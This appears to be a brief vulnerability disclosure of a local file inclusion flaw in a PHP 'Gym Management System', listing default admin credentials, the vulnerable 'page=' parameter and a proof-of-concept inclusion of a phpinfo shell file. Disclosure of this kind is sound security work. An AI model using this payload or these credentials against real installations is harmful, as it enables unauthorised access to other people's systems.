# Gym Management System v1.0 by oretnom23 has The local file contains

The password for the backend login account is: admin/admin123

vendor : https://www.sourcecodester.com/php/14541/gym-management-system-using-phpmysqli-source-code.html

Vulnerability File: ip/gym-management-system/index.php?page=

Vulnerability location: ip/gym-management-system/index.php?page=, page

Payload: ip/gym-management-system/index.php?page=shell
![image](https://user-images.githubusercontent.com/54017627/167055236-73ab971c-99fb-4df9-89b1-e32ec6f5e073.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/167055202-9a09bcdc-0dbb-407f-bd09-9b5b4fb3d361.png)

And visit http://sns/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/167055186-dba329b1-4698-4459-a0a5-072d1b48944c.png)
